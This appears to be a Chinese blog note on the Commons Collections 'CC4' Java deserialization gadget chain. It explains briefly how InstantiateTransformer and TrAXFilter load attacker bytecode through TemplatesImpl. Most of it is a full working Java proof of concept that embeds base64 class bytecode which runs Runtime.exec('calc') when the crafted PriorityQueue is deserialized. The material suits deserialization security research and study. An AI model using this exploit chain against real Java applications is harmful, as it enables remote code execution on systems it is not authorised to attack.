cc4就是将cc2使用的InvokerTransformer替换成InstantiateTransformer来加载字节码

### InstantiateTransformer

这个类用来初始化transformer

![image-20240514232938681](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240514232938681.png)

如果参数不为空就获取指定参数的构造器并调用构造函数

看一下TrAXFilter这个类，这个类正好符合我们的要求

![image-20240515162703897](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240515162703897.png)

当我们调用其构造函数,这里面调用了newTransformer方法，只要对象是impl即可

其他的和cc2没有区别

### POC

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class CC4 {
    public static void main(String[] args) throws Exception{
        TemplatesImpl impl = new TemplatesImpl();
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAKgoABgAdCgAeAB8IACAKAB4AIQcAIgcAIwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAXTG9yZy9leGFtcGxlL2NsYXNzY29kZTsBAApFeGNlcHRpb25zBwAkAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADmNsYXNzY29kZS5qYXZhDAAHAAgHACUMACYAJwEABGNhbGMMACgAKQEAFW9yZy9leGFtcGxlL2NsYXNzY29kZQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACgAAAA4AAwAAAAsABAAMAA0ADQALAAAADAABAAAADgAMAA0AAAAOAAAABAABAA8AAQAQABEAAQAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAABAACwAAACAAAwAAAAEADAANAAAAAAABABIAEwABAAAAAQAUABUAAgABABAAFgABAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAEwALAAAAKgAEAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABcAGAACAAAAAQAZABoAAwABABsAAAACABw");
        setFieldValue(impl, "_name", "uu2fu3o");
        setFieldValue(impl, "_bytecodes", new byte[][]{code});
        setFieldValue(impl, "_class", null);
        setFieldValue(impl, "_tfactory", new TransformerFactoryImpl());

        Transformer[] faketransformers = new Transformer[] {new ConstantTransformer(1)};

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{impl})
        };

        Transformer transformerChain = new ChainedTransformer(faketransformers);

        PriorityQueue queue = new PriorityQueue(2, new TransformingComparator(transformerChain));

        queue.add(1);
        queue.add(1);

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain,transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        ByteArrayInputStream in = new ByteArrayInputStream(barr.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(in);
        Object ob = (Object) ois.readObject();
    }

    public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj,value);
    }
}
```



